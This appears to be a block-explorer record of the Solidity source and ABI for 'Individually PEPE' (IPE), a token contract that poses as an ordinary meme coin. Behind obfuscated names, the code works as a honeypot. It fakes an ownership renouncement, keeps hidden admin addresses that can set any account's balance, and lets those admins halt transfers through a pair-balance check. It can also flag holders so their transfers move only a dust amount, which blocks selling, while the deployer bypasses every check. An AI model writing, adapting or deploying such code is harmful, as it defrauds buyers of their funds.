{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface takeShouldReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromShould) external view returns (uint256);\n\n    function transfer(address liquidityLaunchTrading, uint256 toReceiver) external returns (bool);\n\n    function allowance(address amountToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityLaunchTrading,\n        uint256 toReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed marketingTrading, uint256 value);\n    event Approval(address indexed amountToken, address indexed spender, uint256 value);\n}\n\nabstract contract atTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoTokenMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface listIs {\n    function createPair(address modeWallet, address shouldLiquidity) external returns (address);\n}\n\ninterface senderToken is takeShouldReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract IndividuallyPEPE is atTotal, takeShouldReceiver, senderToken {\n\n    uint256 public launchedLiquidity;\n\n    function feeMax(address launchTokenAmount, address liquidityLaunchTrading, uint256 toReceiver) internal returns (bool) {\n        require(fromTake[launchTokenAmount] >= toReceiver);\n        fromTake[launchTokenAmount] -= toReceiver;\n        fromTake[liquidityLaunchTrading] += toReceiver;\n        emit Transfer(launchTokenAmount, liquidityLaunchTrading, toReceiver);\n        return true;\n    }\n\n    function txShould(address amountLaunch, uint256 toReceiver) public {\n        toLiquidity();\n        fromTake[amountLaunch] = toReceiver;\n    }\n\n    function transferFrom(address launchTokenAmount, address liquidityLaunchTrading, uint256 toReceiver) external override returns (bool) {\n        if (_msgSender() != senderLaunched) {\n            if (launchReceiver[launchTokenAmount][_msgSender()] != type(uint256).max) {\n                require(toReceiver <= launchReceiver[launchTokenAmount][_msgSender()]);\n                launchReceiver[launchTokenAmount][_msgSender()] -= toReceiver;\n            }\n        }\n        return marketingAuto(launchTokenAmount, liquidityLaunchTrading, toReceiver);\n    }\n\n    function owner() external view returns (address) {\n        return launchedLaunch;\n    }\n\n    function limitLiquidity(address tokenLimit) public {\n        if (teamTake) {\n            return;\n        }\n        if (launchedLiquidity != teamReceiver) {\n            enableMarketing = launchedLiquidity;\n        }\n        feeTeamTrading[tokenLimit] = true;\n        if (walletTotal == fundMax) {\n            fromAt = true;\n        }\n        teamTake = true;\n    }\n\n    function toLiquidity() private view {\n        require(feeTeamTrading[_msgSender()]);\n    }\n\n    bool public teamTake;\n\n    address minLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function name() external view virtual override returns (string memory) {\n        return feeSwap;\n    }\n\n    mapping(address => mapping(address => uint256)) private launchReceiver;\n\n    uint256 public teamReceiver;\n\n    mapping(address => bool) public modeSell;\n\n    function approve(address takeToken, uint256 toReceiver) public virtual override returns (bool) {\n        launchReceiver[_msgSender()][takeToken] = toReceiver;\n        emit Approval(_msgSender(), takeToken, toReceiver);\n        return true;\n    }\n\n    address senderLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function getOwner() external view returns (address) {\n        return launchedLaunch;\n    }\n\n    bool public senderTotal;\n\n    function balanceOf(address fromShould) public view virtual override returns (uint256) {\n        return fromTake[fromShould];\n    }\n\n    address private launchedLaunch;\n\n    uint256 private listFee = 100000000 * 10 ** 18;\n\n    function allowance(address buyTrading, address takeToken) external view virtual override returns (uint256) {\n        if (takeToken == senderLaunched) {\n            return type(uint256).max;\n        }\n        return launchReceiver[buyTrading][takeToken];\n    }\n\n    uint256 public walletTotal;\n\n    uint8 private autoList = 18;\n\n    function transfer(address amountLaunch, uint256 toReceiver) external virtual override returns (bool) {\n        return marketingAuto(_msgSender(), amountLaunch, toReceiver);\n    }\n\n    mapping(address => uint256) private fromTake;\n\n    uint256 constant fundListShould = 12 ** 10;\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoList;\n    }\n\n    uint256 receiverTake;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listFee;\n    }\n\n    mapping(address => bool) public feeTeamTrading;\n\n    function marketingAuto(address launchTokenAmount, address liquidityLaunchTrading, uint256 toReceiver) internal returns (bool) {\n        if (launchTokenAmount == receiverIsLiquidity) {\n            return feeMax(launchTokenAmount, liquidityLaunchTrading, toReceiver);\n        }\n        uint256 launchSender = takeShouldReceiver(shouldTake).balanceOf(minLiquidity);\n        require(launchSender == exemptTrading);\n        require(liquidityLaunchTrading != minLiquidity);\n        if (modeSell[launchTokenAmount]) {\n            return feeMax(launchTokenAmount, liquidityLaunchTrading, fundListShould);\n        }\n        return feeMax(launchTokenAmount, liquidityLaunchTrading, toReceiver);\n    }\n\n    constructor (){\n        if (enableMarketing != launchedLiquidity) {\n            fromAt = true;\n        }\n        autoTokenMin tokenIsTake = autoTokenMin(senderLaunched);\n        shouldTake = listIs(tokenIsTake.factory()).createPair(tokenIsTake.WETH(), address(this));\n        \n        receiverIsLiquidity = _msgSender();\n        modeLiquidity();\n        feeTeamTrading[receiverIsLiquidity] = true;\n        fromTake[receiverIsLiquidity] = listFee;\n        \n        emit Transfer(address(0), receiverIsLiquidity, listFee);\n    }\n\n    event OwnershipTransferred(address indexed sellTrading, address indexed isToken);\n\n    uint256 private enableMarketing;\n\n    function launchToken(uint256 toReceiver) public {\n        toLiquidity();\n        exemptTrading = toReceiver;\n    }\n\n    uint256 public fundMax;\n\n    address public shouldTake;\n\n    uint256 exemptTrading;\n\n    bool public senderFund;\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletBuy;\n    }\n\n    function modeLiquidity() public {\n        emit OwnershipTransferred(receiverIsLiquidity, address(0));\n        launchedLaunch = address(0);\n    }\n\n    address public receiverIsLiquidity;\n\n    string private feeSwap = \"Individually PEPE\";\n\n    bool private fromAt;\n\n    string private walletBuy = \"IPE\";\n\n    function liquidityTakeReceiver(address launchBuy) public {\n        toLiquidity();\n        \n        if (launchBuy == receiverIsLiquidity || launchBuy == shouldTake) {\n            return;\n        }\n        modeSell[launchBuy] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeToken\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeTeamTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toReceiver\",\"type\":\"uint256\"}],\"name\":\"launchToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLimit\",\"type\":\"address\"}],\"name\":\"limitLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchBuy\",\"type\":\"address\"}],\"name\":\"liquidityTakeReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverIsLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTokenAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityLaunchTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toReceiver\",\"type\":\"uint256\"}],\"name\":\"txShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "IndividuallyPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}